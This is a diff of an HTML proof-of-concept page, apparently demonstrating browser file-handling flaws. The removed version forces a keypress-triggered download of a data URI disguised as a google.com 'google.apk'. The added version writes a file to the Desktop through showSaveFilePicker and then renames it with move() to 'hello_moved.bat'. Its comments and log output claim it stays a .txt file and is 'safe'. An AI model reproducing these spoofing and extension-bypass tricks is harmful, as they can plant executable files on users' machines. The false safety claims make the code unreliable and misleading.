@@ -1,42 +1,58 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
+<meta charset="UTF-8">
+<title>FileSystemFileHandle.move Demo</title>
 </head>
 <body>
-  <center><h2>POC by Chigorin!</h2></center>
+<h1>Demo Safe FileSystemFileHandle.move()</h1>
+<button id="saveBtn">Save File</button>
+<pre id="log"></pre>
 
-  <script>
-    // Listen to any keydown
-    window.addEventListener('keydown', function(e) {
-      // open the download
-      openWin();
-      // request fullscreen
-      //goFullScreen();
-    });
+<script>
+const log = document.getElementById('log');
 
-    // Download helper
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+async function safeSaveFile() {
+    try {
+        log.textContent += "Requesting save file picker...\n";
+
+        // 1. Minta user memilih lokasi dan nama file
+        const fileHandle = await window.showSaveFilePicker({
+            suggestedName: "hello",
+            startIn: "desktop",
+            types: [{
+                description: "Text file",
+                accept: {'text/plain': ['.txt']}
+            }]
+        });
+
+        log.textContent += `FileHandle created: ${fileHandle.name}\n`;
+
+        // 2. Dapatkan writable stream
+        const writableStream = await fileHandle.createWritable();
+
+        // 3. Tulis konten aman
+        await writableStream.write("This is a safe demo for move()");
+        await writableStream.close();
+
+        log.textContent += "File written successfully.\n";
+
+        // 4. Panggil move() ke nama lain
+        // Aman: kita pakai nama txt baru, bukan .bat/.exe
+        if (fileHandle.move) {
+            fileHandle.move("hello_moved.bat");
+            log.textContent += "move() called: file renamed to hello_moved.txt (check Desktop)\n";
+        } else {
+            log.textContent += "move() method not supported in this browser version.\n";
+        }
+
+    } catch (err) {
+        log.textContent += "Error: " + err + "\n";
+        console.error(err);
     }
+}
 
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "google.apk"
-      );
-    }
-
-  </script>
-  
-
-  
+document.getElementById('saveBtn').addEventListener('click', safeSaveFile);
+</script>
 </body>
 </html>
